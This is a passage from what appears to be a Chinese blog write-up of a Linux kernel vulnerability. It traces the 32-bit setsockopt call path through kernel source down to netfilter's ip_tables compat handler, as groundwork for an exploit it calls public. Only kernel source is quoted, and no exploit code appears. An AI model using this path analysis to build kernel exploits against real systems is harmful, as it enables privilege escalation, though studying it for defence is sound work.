pf,</span><br><span class="hljs-params"><span class="hljs-type">int</span> val, <span class="hljs-type">int</span> get)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> *<span class="hljs-title">ops</span>;</span><br><br>mutex_lock(&amp;nf_sockopt_mutex);<br>list_for_each_entry(ops, &amp;nf_sockopts, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (ops-&gt;pf == pf) &#123;<br><span class="hljs-keyword">if</span> (!try_module_get(ops-&gt;owner))<br><span class="hljs-keyword">goto</span> out_nosup;<br><br><span class="hljs-keyword">if</span> (get) &#123;<br><span class="hljs-keyword">if</span> (val &gt;= ops-&gt;get_optmin &amp;&amp;<br>val &lt; ops-&gt;get_optmax)<br><span class="hljs-keyword">goto</span> out;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (val &gt;= ops-&gt;set_optmin &amp;&amp;<br>val &lt; ops-&gt;set_optmax)<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>module_put(ops-&gt;owner);<br>&#125;<br>&#125;<br>out_nosup:<br>ops = ERR_PTR(-ENOPROTOOPT);<br>out:<br>mutex_unlock(&amp;nf_sockopt_mutex);<br><span class="hljs-keyword">return</span> ops;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>在 iptables 模块的初始化函数中注册了函数表</strong> <code>ipt_sockopts</code>，<code>nf_register_sockopt()</code> 用以在 <code>nf_sockopts</code> 链表中插入节点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">ip_tables_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* Register setsockopt */</span><br>ret = nf_register_sockopt(&amp;ipt_sockopts);<br></code></pre></td></tr></table></figure><p>那么一切就清楚了，对于 setsockopt 系统调用，我们最终调用的应该是 <code>do_ipt_set_ctl</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_sockopt_ops</span> <span class="hljs-title">ipt_sockopts</span> =</span> &#123;<br>.pf= PF_INET,<br>.set_optmin= IPT_BASE_CTL,<br>.set_optmax= IPT_SO_SET_MAX+<span class="hljs-number">1</span>,<br>.<span class="hljs-built_in">set</span>= do_ipt_set_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_set= compat_do_ipt_set_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.get_optmin= IPT_BASE_CTL,<br>.get_optmax= IPT_SO_GET_MAX+<span class="hljs-number">1</span>,<br>.get= do_ipt_get_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_get= compat_do_ipt_get_ctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="32-位下的-setsockopt-系统调用">32 位下的 setsockopt 系统调用</h2><blockquote><p>本次漏洞利用中我们创建 socket 时使用 <code>socket(AF_INTE, SOCK_STREAM, 0)</code>，故后面涉及到的 socket 源码都会顺着这个路径分析</p></blockquote><p>在设置了 <code>CONFIG_COMPAT=y</code> 的情况下（意为兼容 32 位，默认开启），32位程序进行系统调用时<strong>实际上是通过 COMPAT_SYSCALL_DEFINE 宏定义的兼容 32 位系统调用完成的</strong></p><blockquote><p>我们知道 32 位程序通过 0x80 号中断进行系统调用，而 64 位程序则通过 syscall 指令完成系统调用，因此在64位内核中将 0x80 号中断专门用作兼容 32 位进程的系统调用入口</p></blockquote><p>因此当一个 32 位程序进行 setsockopt 系统调用时，最终会调用到 <code>__compat_sys_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">COMPAT_SYSCALL_DEFINE5(setsockopt, <span class="hljs-type">int</span>, fd, <span class="hljs-type">int</span>, level, <span class="hljs-type">int</span>, optname,<br>       <span class="hljs-type">char</span> __user *, optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, optlen)<br>&#123;<br><span class="hljs-keyword">return</span> __compat_sys_setsockopt(fd, level, optname, optval, optlen);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>其实 glibc 中的 setsockopt 的 wrapper 是通过 <code>socketcall</code> 这一系统调用进行的，实际上在很久以前该系统调用其实是 socket 相关系统调用的唯一入口点，后面各种子功能拆分成了多个系统调用，但是该系统调用仍然保留了下来，因此对于同一个功能，即可以走 socketcall 系统调用，也可以走拆分出来的那个系统调用，最后的路径是相同的</p></blockquote><p>在公开的 exp 中漏洞触发路径指定了 level 为 <code>SOL_IP</code>，故在 <code>__compat_sys_setsockopt()</code>中最终会走到 <code>sock-&gt;ops-&gt;compat_setsockopt</code> 或 <code>sock-&gt;ops-&gt;setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __compat_sys_setsockopt(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,<br>   <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)<br>&#123;<br><span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">socket</span> *<span class="hljs-title">sock</span>;</span><br><br><span class="hljs-keyword">if</span> (optlen &gt; INT_MAX)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>sock = sockfd_lookup(fd, &amp;err);<br><span class="hljs-keyword">if</span> (sock) &#123;<br>err = security_socket_setsockopt(sock, level, optname);<br><span class="hljs-keyword">if</span> (err) &#123;<br>sockfd_put(sock);<br><span class="hljs-keyword">return</span> err;<br>&#125;<br><br><span class="hljs-keyword">if</span> (level == SOL_SOCKET)<br>err = compat_sock_setsockopt(sock, level,<br>optname, optval, optlen);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sock-&gt;ops-&gt;compat_setsockopt)<br>err = sock-&gt;ops-&gt;compat_setsockopt(sock, level,<br>optname, optval, optlen);<br><span class="hljs-keyword">else</span><br>err = sock-&gt;ops-&gt;setsockopt(sock, level,<br>optname, optval, optlen);<br>sockfd_put(sock);<br>&#125;<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里应该走入哪条路径？那么这里我们需要先看创建该函数表的过程，这个函数表其实是在 socket 创建时（<code>__sock_create()</code>）进行动态指定的，通过对应 family 指定的创建函数进行创建：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __sock_create(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">int</span> family, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol,<br> <span class="hljs-keyword">struct</span> socket **res, <span class="hljs-type">int</span> kern)<br>&#123;<br>    <span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">socket</span> *<span class="hljs-title">sock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> *<span class="hljs-title">pf</span>;</span><br>    <span class="hljs-comment">//...</span><br>rcu_read_lock();<br>pf = rcu_dereference(net_families[family]);<br>err = -EAFNOSUPPORT;<br><span class="hljs-keyword">if</span> (!pf)<br><span class="hljs-keyword">goto</span> out_release;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We will call the -&gt;create function, that possibly is in a loadable</span><br><span class="hljs-comment"> * module, so we have to bump that loadable module refcnt first.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!try_module_get(pf-&gt;owner))<br><span class="hljs-keyword">goto</span> out_release;<br><br><span class="hljs-comment">/* Now protected by module ref count */</span><br>rcu_read_unlock();<br><br>err = pf-&gt;create(net, sock, protocol, kern);<br></code></pre></td></tr></table></figure><p>比如说对于 <code>AF_INET</code> （<code>PF_INET</code>）而言，应该用到的是 <code>inet_create()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_proto_family</span> <span class="hljs-title">inet_family_ops</span> =</span> &#123;<br>.family = PF_INET,<br>.create = inet_create,<br>.owner= THIS_MODULE,<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 <code>inet_init()</code> 函数中使用 <code>sock_register</code> 在 <code>net_families</code> 数组中注册了该结构体（<code>__init</code> 宏可以看出这是一个模块初始化函数）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">inet_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Tell SOCKET that we are alive...</span><br><span class="hljs-comment"> */</span><br><br>(<span class="hljs-type">void</span>)sock_register(&amp;inet_family_ops);<br></code></pre></td></tr></table></figure><p>而在 <code>inet_create()</code> 中，则是遍历 数组找到对应类型的函数表给到 socket：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">inet_create</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> protocol,</span><br><span class="hljs-params">       <span class="hljs-type">int</span> kern)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_protosw</span> *<span class="hljs-title">answer</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_sock</span> *<span class="hljs-title">inet</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto</span> *<span class="hljs-title">answer_prot</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> answer_flags;<br><span class="hljs-type">int</span> try_loading_module = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (protocol &lt; <span class="hljs-number">0</span> || protocol &gt;= IPPROTO_MAX)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>sock-&gt;state = SS_UNCONNECTED;<br><br><span class="hljs-comment">/* Look for the requested type/protocol pair. */</span><br>lookup_protocol:<br>err = -ESOCKTNOSUPPORT;<br>rcu_read_lock();<br>list_for_each_entry_rcu(answer, &amp;inetsw[sock-&gt;type], <span class="hljs-built_in">list</span>) &#123;<br><br>err = <span class="hljs-number">0</span>;<br><span class="hljs-comment">/* Check the non-wild match. */</span><br><span class="hljs-keyword">if</span> (protocol == answer-&gt;protocol) &#123;<br><span class="hljs-keyword">if</span> (protocol != IPPROTO_IP)<br><span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Check for the two wild cases. */</span><br><span class="hljs-keyword">if</span> (IPPROTO_IP == protocol) &#123;<br>protocol = answer-&gt;protocol;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (IPPROTO_IP == answer-&gt;protocol)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>err = -EPROTONOSUPPORT;<br>&#125;<br>    <span class="hljs-comment">//...</span><br>    sock-&gt;ops = answer-&gt;ops;<br>    answer_prot = answer-&gt;prot;<br></code></pre></td></tr></table></figure><p>在这里使用内核的 rcu 遍历宏 <code>list_for_each_entry_rcu</code> 对 <code>inetsw</code> 进行遍历，实际上该链表通过 <code>inetsw_array</code> 建立，对于 <code>IPPROTO_IP</code> 而言其函数表应为 <code>inet_stream_ops</code>（我们在建立 socket 时 protocol 指定为 0，即 <code>IPPROTO_IP</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_protosw</span> <span class="hljs-title">inetsw_array</span>[] =</span><br>&#123;<br>&#123;<br>.type =       SOCK_STREAM,<br>.protocol =   IPPROTO_TCP,<br>.prot =       &amp;tcp_prot,<br>.ops =        &amp;inet_stream_ops,<br>.flags =      INET_PROTOSW_PERMANENT |<br>      INET_PROTOSW_ICSK,<br>&#125;,<br></code></pre></td></tr></table></figure><p>因此我们在进行 setsockopt 时其实对应应该调用到 <code>inet_stream_ops</code> 中的函数，这里因为我们开启了编译选项 <code>CONFIG_COMPAT</code>（默认开启），<strong>所以 setsockopt 系统调用最终应该会调用到</strong><code>compat_sock_common_setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto_ops</span> <span class="hljs-title">inet_stream_ops</span> =</span> &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_setsockopt = compat_sock_common_setsockopt,<br>.compat_getsockopt = compat_sock_common_getsockopt,<br>.compat_ioctl   = inet_compat_ioctl,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.set_rcvlowat   = tcp_set_rcvlowat,<br>&#125;;<br></code></pre></td></tr></table></figure><p>他又会调用到 <code>sk-&gt;sk_prot-&gt;compat_setsockopt()</code>，其实就是 socket 结构体里的 sock 结构体里的 sock_common 结构体的 <code>skc_prot</code> 成员（<code>proto</code> 结构体类型）的 <code>compat_setsockopt</code> 函数指针（<s>你套你🦄呢</s>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">compat_sock_common_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params">  <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span> =</span> sock-&gt;sk;<br><br><span class="hljs-keyword">if</span> (sk-&gt;sk_prot-&gt;compat_setsockopt != <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> sk-&gt;sk_prot-&gt;compat_setsockopt(sk, level, optname,<br>      optval, optlen);<br><span class="hljs-keyword">return</span> sk-&gt;sk_prot-&gt;setsockopt(sk, level, optname, optval, optlen);<br>&#125;<br>EXPORT_SYMBOL(compat_sock_common_setsockopt);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>又绕回到 <code>inet_create</code>，这里应该是对应到 <code>tcp_prot</code> 函数表，对应调用到 <code>compat_tcp_setsockopt()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proto</span> <span class="hljs-title">tcp_prot</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;TCP&quot;</span>,<br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_setsockopt= compat_tcp_setsockopt,<br>.compat_getsockopt= compat_tcp_getsockopt,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.diag_destroy= tcp_abort,<br>&#125;;<br>EXPORT_SYMBOL(tcp_prot);<br></code></pre></td></tr></table></figure><p>在公开的 exp 中漏洞触发路径指定了 level 为 <code>SOL_IP</code>，所以这里应该会对应调用到 <code>inet_csk_compat_setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">compat_tcp_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params">  <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-keyword">if</span> (level != SOL_TCP)<br><span class="hljs-keyword">return</span> inet_csk_compat_setsockopt(sk, level, optname,<br>  optval, optlen);<br><span class="hljs-keyword">return</span> do_tcp_setsockopt(sk, level, optname, optval, optlen);<br>&#125;<br>EXPORT_SYMBOL(compat_tcp_setsockopt);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>在 <code>inet_csk_compat_setsockopt</code> 中会调用到 <code>icsk-&gt;icsk_af_ops-&gt;compat_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">inet_csk_compat_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params">       <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock</span> *<span class="hljs-title">icsk</span> =</span> inet_csk(sk);<br><br><span class="hljs-keyword">if</span> (icsk-&gt;icsk_af_ops-&gt;compat_setsockopt)<br><span class="hljs-keyword">return</span> icsk-&gt;icsk_af_ops-&gt;compat_setsockopt(sk, level, optname,<br>    optval, optlen);<br><span class="hljs-keyword">return</span> icsk-&gt;icsk_af_ops-&gt;setsockopt(sk, level, optname,<br>     optval, optlen);<br>&#125;<br>EXPORT_SYMBOL_GPL(inet_csk_compat_setsockopt);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>这里 <code>inet_csk()</code> 展开其实就是一个强制类型转换，那这里我们又要转回去看 <strong>socket 中 sock 结构体的初始化过程</strong>，在 <code>inet_create()</code>  中使用 <code>sock_alloc()</code> 创建 sock 结构体，最后会调用到 <code>tcp_v4_init_sock</code>，这里我们看到其初始化所用的函数表为 <code>ipv4_specific</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tcp_v4_init_sock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock</span> *<span class="hljs-title">icsk</span> =</span> inet_csk(sk);<br><br>tcp_init_sock(sk);<br><br>icsk-&gt;icsk_af_ops = &amp;ipv4_specific;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_TCP_MD5SIG</span><br>tcp_sk(sk)-&gt;af_specific = &amp;tcp_sock_ipv4_specific;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以最后应该调用到 <code>compat_ip_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inet_connection_sock_af_ops</span> <span class="hljs-title">ipv4_specific</span> =</span> &#123;<br>.queue_xmit   = ip_queue_xmit,<br>.send_check   = tcp_v4_send_check,<br>.rebuild_header   = inet_sk_rebuild_header,<br>.sk_rx_dst_set   = inet_sk_rx_dst_set,<br>.conn_request   = tcp_v4_conn_request,<br>.syn_recv_sock   = tcp_v4_syn_recv_sock,<br>.net_header_len   = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> iphdr),<br>.setsockopt   = ip_setsockopt,<br>.getsockopt   = ip_getsockopt,<br>.addr2sockaddr   = inet_csk_addr2sockaddr,<br>.sockaddr_len   = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in),<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br>.compat_setsockopt = compat_ip_setsockopt,<br>.compat_getsockopt = compat_ip_getsockopt,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>.mtu_reduced   = tcp_v4_mtu_reduced,<br>&#125;;<br></code></pre></td></tr></table></figure><p>由于我们开启了 Netfilter，所以在 <code>compat_ip_setsockopt()</code> 最后会调用到 <code>compat_nf_setsockopt</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">compat_ip_setsockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">int</span> level, <span class="hljs-type">int</span> optname,</span><br><span class="hljs-params"> <span class="hljs-type">char</span> __user *optval, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> optlen)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER</span><br><span class="hljs-comment">/* we need to exclude all possible ENOPROTOOPTs except default case */</span><br><span class="hljs-keyword">if</span> (err == -ENOPROTOOPT &amp;&amp; optname != IP_HDRINCL &amp;&amp;<br>optname != IP_IPSEC_POLICY &amp;&amp;<br>optname != IP_XFRM_POLICY &amp;&amp;<br>!ip_mroute_opt(optname))<br>err = compat_nf_setsockopt(sk, PF_INET, optname, optval,<br>   optlen);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> err;<br>&#125;<br>EXPORT_SYMBOL(compat_ip_setsockopt);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>这个函数和 <code>compat_nf_getsockopt()</code> 一样都是 <code>compat_nf_sockopt()</code> 的 wrapper，在该函数中会使用 找到对应的函数表，根据对应操作调用对应函数，我们是 32 位进程的系统调用，所以应该走入 <code>compat_set</code>这一指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPAT</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compat_nf_sockopt</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-type">u_int8_t</span> pf, <span 